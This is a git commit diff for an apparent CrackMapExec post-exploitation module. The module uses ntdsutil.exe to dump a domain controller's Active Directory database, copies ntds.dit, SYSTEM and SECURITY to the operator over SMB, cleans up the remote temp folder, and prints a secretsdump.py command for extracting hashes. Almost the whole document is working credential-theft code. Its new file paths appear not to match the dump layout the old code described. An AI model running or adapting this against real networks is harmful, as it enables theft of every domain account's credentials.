32a77ffd7c670c85b6918a2403749806f9ff0eaa
zblurx <seigneuret.thomas@pm.me>
2022-04-19 20:08:00 +0200

    fix ntdsutil module

--- cme/modules/ntdsutil.py
+++ cme/modules/ntdsutil.py
@@ -1,3 +1,5 @@
+import os
+
 class CMEModule:
     '''
         Dump NTDS with ntdsutil
@@ -7,26 +9,21 @@ class CMEModule:
     name = 'ntdsutil'
     description = 'Dump NTDS with ntdsutil'
     supported_protocols = ['smb']
-    opsec_safe= False #Does the module touch disk?
-    multiple_hosts = False #Does it make sense to run this module on multiple hosts at a time?
+    opsec_safe= False
+    multiple_hosts = False
 
     def options(self, context, module_options):
         '''
         Dump NTDS with ntdsutil
         Module by @zblurx
 
-        TAR_NAME    Name of the tar archive
         DIR_RESULT  Local dir to write ntds dump
         '''
         self.share = "ADMIN$"
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
         self.dump_location = 'ntdsutil'
-        self.tar_archive = 'ntdsutil.tar'
-        self.dir_result = './'
-
-        if 'TAR_NAME' in module_options:
-            self.tar_archive = module_options['TAR_NAME']
+        self.dir_result = 'ntdsutil'
 
         if 'DIR_RESULT' in module_options:
             self.dir_result = module_options['DIR_RESULT']
@@ -35,7 +32,6 @@ class CMEModule:
 
 
     def on_admin_login(self, context, connection):
-        '''Concurrent. Required if on_login is not present. This gets called on each authenticated connection with Administrative privileges'''
         command = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)
         context.log.info('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir,self.dump_location))
         context.log.debug('Executing command {}'.format(command))
@@ -47,26 +43,40 @@ class CMEModule:
             context.log.error("Error while dumping NTDS")
             return
 
-        command = "powershell \"tar -C %s -cvf %s%s %s\"" % ( self.tmp_dir, self.tmp_dir, self.tar_archive, self.dump_location)
-        context.log.info('Packing up into %s' % self.tar_archive)
-        context.log.debug('Executing command {}'.format(command))
-        p = connection.execute(command, True)
-        context.log.debug(p)
+        if not os.path.isdir(self.dir_result):
+            os.makedirs(self.dir_result, exist_ok=True)
 
-        context.log.info('Copy %s to host' % self.tar_archive)
-        with open(self.dir_result + self.tar_archive, 'wb+') as dump_file:
+        context.log.info('Copy ntds.dit to host')
+        with open(os.path.join(self.dir_result,'ntds.dit'), 'wb+') as dump_file:
             try:
-                connection.conn.getFile(self.share, self.tmp_share + self.tar_archive, dump_file.write)
-                context.log.success('Copied NTDS dump into %s' % self.tar_archive)
+                connection.conn.getFile(self.share, self.tmp_share + 'ntds.dit', dump_file.write)
+                context.log.success('Copied NTDS dump into ntds.dit')
             except Exception as e:
                 context.log.error('Error while get file: {}'.format(e))
-                
 
-        try:
-            connection.conn.deleteFile(self.share, self.tmp_share + self.tar_archive)
-            context.log.success('Deleted %s on the %s share' % (self.tar_archive, self.share))
-        except Exception as e:
-            context.log.error('Error deleting {} file on share {}: {}'.format(self.tar_archive,self.share, e))
+        context.log.info('Copy ntds.jfm to host')
+        with open(os.path.join(self.dir_result,'ntds.jfm'), 'wb+') as dump_file:
+            try:
+                connection.conn.getFile(self.share, self.tmp_share + 'ntds.jfm', dump_file.write)
+                context.log.success('Copied NTDS dump into ntds.jfm')
+            except Exception as e:
+                context.log.error('Error while get file: {}'.format(e))
+
+        context.log.info('Copy SYSTEM to host')
+        with open(os.path.join(self.dir_result,'SYSTEM'), 'wb+') as dump_file:
+            try:
+                connection.conn.getFile(self.share, self.tmp_share + 'SYSTEM', dump_file.write)
+                context.log.success('Copied NTDS dump into SYSTEM')
+            except Exception as e:
+                context.log.error('Error while get file: {}'.format(e))
+
+        context.log.info('Copy SECURITY to host')
+        with open(os.path.join(self.dir_result,'SECURITY'), 'wb+') as dump_file:
+            try:
+                connection.conn.getFile(self.share, self.tmp_share + 'SECURITY', dump_file.write)
+                context.log.success('Copied NTDS dump into SECURITY')
+            except Exception as e:
+                context.log.error('Error while get file: {}'.format(e))
 
         try:
             command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
@@ -76,4 +86,4 @@ class CMEModule:
             context.log.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))
 
         context.log.highlight("""Now simply:
-        tar -xf %s%s && secretsdump.py -system ntdsutil/registry/SYSTEM -security ntdsutil/registry/SECURITY -ntds ntdsutil/Active\ Directory/ntds.dit LOCAL"""% (self.dir_result, self.tar_archive))
+        secretsdump.py -system %s/SYSTEM -security %s/SECURITY -ntds %s/ntds.dit LOCAL"""% (self.dir_result, self.dir_result, self.dir_result))
